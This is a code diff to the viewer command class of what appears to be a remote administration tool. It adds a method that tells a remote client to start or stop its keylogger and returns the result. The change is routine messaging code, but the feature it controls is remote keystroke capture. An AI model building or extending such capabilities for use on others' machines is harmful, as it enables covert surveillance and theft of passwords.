@@ -43,6 +43,8 @@ import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
 import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
+import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyloggerStateChange;
+import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
 import com.subterranean_security.crimson.core.proto.Listener.RQ_AddListener;
 import com.subterranean_security.crimson.core.proto.Listener.RQ_RemoveListener;
@@ -68,7 +70,6 @@ import com.subterranean_security.crimson.core.util.Crypto;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 import com.subterranean_security.crimson.viewer.ViewerStore;
-import com.subterranean_security.crimson.viewer.ui.screen.files.FileTable;
 import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
 import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;
 
@@ -554,6 +555,27 @@ public enum ViewerCommands {
 		} catch (InterruptedException e) {
 		}
 		return null;
+	}
+
+	public static Outcome changeKeyloggerState(int cid, State state) {
+		Outcome.Builder outcome = Outcome.newBuilder();
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid).setSid(Common.cvid)
+					.setRqKeyloggerStateChange(RQ_KeyloggerStateChange.newBuilder().setNewState(state)), 4);
+
+			if (m == null) {
+				outcome.setResult(false).setComment("Request timed out");
+			} else {
+				if (m.getRsKeyloggerStateChange().getResult().getResult()) {
+					// TODO update profile
+				}
+				return m.getRsKeyloggerStateChange().getResult();
+			}
+
+		} catch (InterruptedException e) {
+			outcome.setResult(false).setComment("Interrupted");
+		}
+		return outcome.build();
 	}
 
 }
